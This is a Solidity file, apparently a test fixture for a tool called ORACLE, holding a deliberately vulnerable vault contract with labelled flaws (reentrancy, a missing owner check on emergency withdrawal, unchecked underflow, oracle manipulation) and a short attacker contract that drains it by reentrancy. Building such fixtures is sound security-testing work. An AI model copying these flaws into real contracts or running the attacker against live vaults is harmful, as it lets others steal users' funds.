// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title VulnerableVault
 * @notice Intentionally vulnerable contract for ORACLE testing
 * @dev Contains multiple vulnerability patterns:
 *      - Reentrancy in withdraw()
 *      - Access control flaw in emergencyWithdraw()
 *      - Integer underflow risk in transfer()
 *      - Price oracle manipulation susceptibility
 */
contract VulnerableVault {
    mapping(address => uint256) public balances;
    mapping(address => bool) public whitelist;
    
    address public owner;
    address public priceOracle;
    uint256 public totalDeposits;
    
    bool private locked;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    event EmergencyWithdrawal(address indexed caller, uint256 amount);
    
    constructor(address _priceOracle) {
        owner = msg.sender;
        priceOracle = _priceOracle;
        whitelist[msg.sender] = true;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    modifier noReentrancy() {
        require(!locked, "Reentrant");
        locked = true;
        _;
        locked = false;
    }
    
    /**
     * @notice Deposit ETH into vault
     */
    function deposit() external payable {
        require(msg.value > 0, "Must deposit something");
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    /**
     * @notice Withdraw ETH from vault
     * @dev VULNERABILITY: Classic reentrancy - external call before state update
     * @param amount Amount to withdraw
     */
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // VULNERABILITY: External call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // State update after external call - reentrancy vulnerable
        balances[msg.sender] -= amount;
        totalDeposits -= amount;
        
        emit Withdrawal(msg.sender, amount);
    }
    
    /**
     * @notice Secure withdraw with reentrancy guard
     * @param amount Amount to withdraw
     */
    function secureWithdraw(uint256 amount) external noReentrancy {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        balances[msg.sender] -= amount;
        totalDeposits -= amount;
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        emit Withdrawal(msg.sender, amount);
    }
    
    /**
     * @notice Emergency withdrawal for owner
     * @dev VULNERABILITY: Missing access control modifier - anyone can call
     */
    function emergencyWithdraw() external {
        // BUG: Should be onlyOwner but modifier missing
        uint256 amount = address(this).balance;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        emit EmergencyWithdrawal(msg.sender, amount);
    }
    
    /**
     * @notice Transfer balance to another user
     * @dev VULNERABILITY: Potential underflow if user manipulates balance tracking
     * @param to Recipient address
     * @param amount Amount to transfer
     */
    function transfer(address to, uint256 amount) external {
        // Using unchecked for gas savings - but this is risky
        unchecked {
            balances[msg.sender] -= amount;  // Underflow if amount > balance
            balances[to] += amount;
        }
    }
    
    /**
     * @notice Get collateral value using external oracle
     * @dev VULNERABILITY: Oracle can be manipulated via flash loans
     * @param user User address
     * @return Collateral value
     */
    function getCollateralValue(address user) external view returns (uint256) {
        // This calls an external oracle that could be manipulated
        uint256 price = IPriceOracle(priceOracle).getPrice();
        return balances[user] * price / 1e18;
    }
    
    /**
     * @notice Borrow against collateral
     * @dev VULNERABILITY: Uses manipulable oracle price
     * @param amount Amount to borrow
     */
    function borrow(uint256 amount) external {
        uint256 collateralValue = this.getCollateralValue(msg.sender);
        require(collateralValue >= amount * 2, "Insufficient collateral");
        
        // Lend based on potentially manipulated oracle price
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Borrow transfer failed");
    }
    
    /**
     * @notice Add to whitelist
     * @dev Only owner can whitelist
     */
    function addToWhitelist(address user) external onlyOwner {
        whitelist[user] = true;
    }
    
    /**
     * @notice Check if address is whitelisted
     */
    function isWhitelisted(address user) external view returns (bool) {
        return whitelist[user];
    }
    
    /**
     * @notice Get vault balance
     */
    function getVaultBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    receive() external payable {
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }
}

interface IPriceOracle {
    function getPrice() external view returns (uint256);
}

/**
 * @title AttackerContract
 * @notice Example attacker contract for reentrancy
 */
contract ReentrancyAttacker {
    VulnerableVault public vault;
    uint256 public attackCount;
    
    constructor(address _vault) {
        vault = VulnerableVault(payable(_vault));
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }
    
    receive() external payable {
        if (address(vault).balance >= 1 ether && attackCount < 10) {
            attackCount++;
            vault.withdraw(1 ether);
        }
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
